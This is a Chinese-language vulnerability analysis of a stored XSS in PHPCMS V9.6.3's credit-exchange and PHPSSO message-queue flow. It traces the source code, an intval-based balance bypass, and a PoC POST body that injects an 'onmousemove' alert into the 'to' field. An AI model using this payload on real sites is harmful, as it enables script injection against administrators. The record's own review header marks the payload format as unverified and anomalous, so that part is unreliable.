---
source: "hatch 补库批 20260928"
product: "PHPCMS9.6.3 / PHPSso credit queue"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Phpcms V9.6.3 储存型xss"
prerequisites: "来源所述条件，未列明部分仍待核：会员登录、积分兑换/SSO配置有效，管理员查看通信信息且鼠标移动事件"
side_effects: "未执行；本文需注意的操作影响：无转义输出sink被作者略过，只展示队列写入，不能仅入库确认XSS；需用户交互onmousemove"
source_status: "unknown"
id: "vw-495df916767f4b8360798beb"
entity_id: "ve-495df916767f4b8360798beb"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：会员登录、积分兑换/SSO配置有效，管理员查看通信信息且鼠标移动事件

- **结论使用边界（1）**：fromvalue0.6/0.9截为0并非独立绕过任何积分安全，需和0提交比较。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（2）**：payload from=1id=1...格式异常，与源码from==1判定依赖旧PHP弱比较；缺预期to下划线结构，要回源核对。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（3）**：无转义输出sink被作者略过，只展示队列写入，不能仅入库确认XSS；需用户交互onmousemove。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（4）**：源码/中文说明混在同代码块，双GPC环境未准确限定。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Phpcms V9.6.3 储存型xss

一、漏洞简介
------------

二、漏洞影响
------------

Phpcms V9.6.3

三、复现过程
------------

### 漏洞分析

问题出在会员的积分兑换功能，文件：

    /phpcms/modules/member/index.php
     public function change_credit() {
      $memberinfo = $this->memberinfo;
      //加载用户模块配置
      $member_setting = getcache('member_setting');
      $this->_init_phpsso();
      $setting = $this->client->ps_getcreditlist();
      $outcredit = unserialize($setting);
      $setting = $this->client->ps_getapplist();
      $applist = unserialize($setting);

      if(isset($_POST['dosubmit'])) {
       //本系统积分兑换数
       $fromvalue = intval($_POST['fromvalue']);
       //本系统积分类型
       $from = $_POST['from'];
       $toappid_to = explode('_', $_POST['to']);      //这个是问题的参数
       //目标系统appid
       $toappid = $toappid_to[0];
       //目标系统积分类型
       $to = $toappid_to[1];
       if($from == 1) {
        if($memberinfo['point'] < $fromvalue) {
         showmessage(L('need_more_point'), HTTP_REFERER);
        }
       } elseif($from == 2) {
        if($memberinfo['amount'] < $fromvalue) {
         showmessage(L('need_more_amount'), HTTP_REFERER);
        }
       } else {
        showmessage(L('credit_setting_error'), HTTP_REFERER);
       }

       $status = $this->client->ps_changecredit($memberinfo['phpssouid'], $from, $toappid, $to, $fromvalue);

这里有个问题，由于`if($memberinfo['point'] < $fromvalue)`所以，`$fromvalue`不能大于会员的点数，但是没充值的状态下，点数是为0的，但是又由于上面有`intval($fromvalue)`，所以我们可以`$fromvalue=0.9`经过`intval`后就成了`0`，也就绕过了上面的逻辑。跟进`ps_changecredit`函数：

    public function ps_changecredit($uid, $from, $toappid, $to, $credit) {
      return $this->_ps_send('changecredit', array('uid'=>$uid, 'from'=>$from, 'toappid'=>$toappid, 'to'=>$to, 'credit'=>$credit));
     }

继续跟进`_ps_send`函数：

    private function _ps_send($action, $data = null) {
       return $this->_ps_post($this->ps_api_url."/index.php?m=phpsso&c=index&a=".$action, 500000, $this->auth_data($data));
     }

最后是经过`auth_data`函数处理和加密，`auth_data`调用`sys_auth`加密函数进行加密:

    public function auth_data($data) {
      $s = $sep = '';
      foreach($data as $k => $v) {
       if(is_array($v)) {
        $s2 = $sep2 = '';
        foreach($v as $k2 => $v2) {
          $s2 .= "$sep2{$k}[$k2]=".$this->_ps_stripslashes($v2);
         $sep2 = '&';
        }
        $s .= $sep.$s2;
       } else {
        $s .= "$sep$k=".$this->_ps_stripslashes($v);
       }
       $sep = '&';
      }

      $auth_s = 'v='.$this->ps_vsersion.'&appid='.APPID.'&data='.urlencode($this->sys_auth($s));
      return $auth_s;
     }

`_ps_post`函数主要就是让服务器访问自己的网站上的一个地址也就是访问了`phpsso`的`changecredit`函数（方法）。我们先来看看`phpsso`：

    class phpsso {

     public $db, $settings, $applist, $appid, $data;
     /**
      * 构造函数
      */
     public function __construct() {
      $this->db = pc_base::load_model('member_model');
      pc_base::load_app_func('global');

      /*获取系统配置*/
      $this->settings = getcache('settings', 'admin');
      $this->applist = getcache('applist', 'admin');

      if(isset($_GET) && is_array($_GET) && count($_GET) > 0) {
       foreach($_GET as $k=>$v) {
        if(!in_array($k, array('m','c','a'))) {
         $_POST[$k] = $v;
        }
       }
      }

      if(isset($_POST['appid'])) {
       $this->appid = intval($_POST['appid']);
      } else {
       exit('0');
      }

      if(isset($_POST['data'])) {
       parse_str(sys_auth($_POST['data'], 'DECODE', $this->applist[$this->appid]['authkey']), $this->data);


    parse_str(sys_auth($_POST['data'], 'DECODE', $this->applist[$this->appid]['authkey']), $this->data);可以看到是通过sys_auth函数解密（加密跟解密的函数是一样的）。
    最后来看看changecredit：
     public function changecredit() {
      $this->uid = isset($this->data['uid']) ? $this->data['uid'] : exit('0');
      $this->toappid = isset($this->data['toappid']) ? $this->data['toappid'] : exit('0');
      $this->from = isset($this->data['from']) ? $this->data['from'] : exit('0');
      $this->to = isset($this->data['to']) ? $this->data['to'] : exit('0');
      $this->credit = isset($this->data['credit']) ? $this->data['credit'] : exit('0');
      $this->appname = $this->applist[$this->appid]['name'];
      $outcredit = $this->getcredit(1);
      //目标系统积分增加数
      $this->credit = floor($this->credit * $outcredit[$this->from.'_'.$this->to]['torate'] / $outcredit[$this->from.'_'.$this->to]['fromrate']);

      /*插入消息队列*/
      $noticedata['appname'] = $this->appname;
      $noticedata['uid'] = $this->uid;
      $noticedata['toappid'] = $this->toappid;
      $noticedata['totypeid'] = $this->to;
      $noticedata['credit'] = $this->credit;
      messagequeue::add('change_credit', $noticedata);
      exit('1');
     }


    这里是进入数据库了：messagequeue::add('change_credit', $noticedata);
     public static function add($operation, $noticedata_send) {
      $db = self::get_db();
      $noticedata_send['action'] = $operation;
      $noticedata_send_string = array2string($noticedata_send);

      if ($noticeid = $db->insert(array('operation'=>$operation, 'noticedata'=>$noticedata_send_string, 'dateline'=>SYS_TIME), 1)) {
       self::notice($operation, $noticedata_send, $noticeid);
       return 1;
      } else {
       return 0;
      }
     }

调用insert写入数据。。这里就不跟了。由于系统开启了gpc（两次，初始化一次，phpsso一次），所以进去的数据是经过两次gpc的输出跟模板就不说了，反正没过滤直接出来

整理一下思路，先从积分兑换填写表单，然后将数据整理成数组经过`sys_auth`加密一次，然后服务器发送数据包给自己，收到数据包之后用`sys_auth`函数解密，然后调用`changecredit`方法，`inert`插入数据库，然后管理员在后台点击通信信息的时候触发xss!

### 漏洞复现

利用方法，先注册一个帐号，然后登录，然后访问:http://www.0-sec.org/index.php?m=member&c=index&a=change\_credit&post:

    dosubmit=1&fromvalue=0.6&from=1id=1`setset'&to=}" onmousemove=alert(1)>//

![1.png](./.resource/PhpcmsV9.6.3储存型xss/media/rId26.png)

参考链接
--------

> https://xz.aliyun.com/t/1860
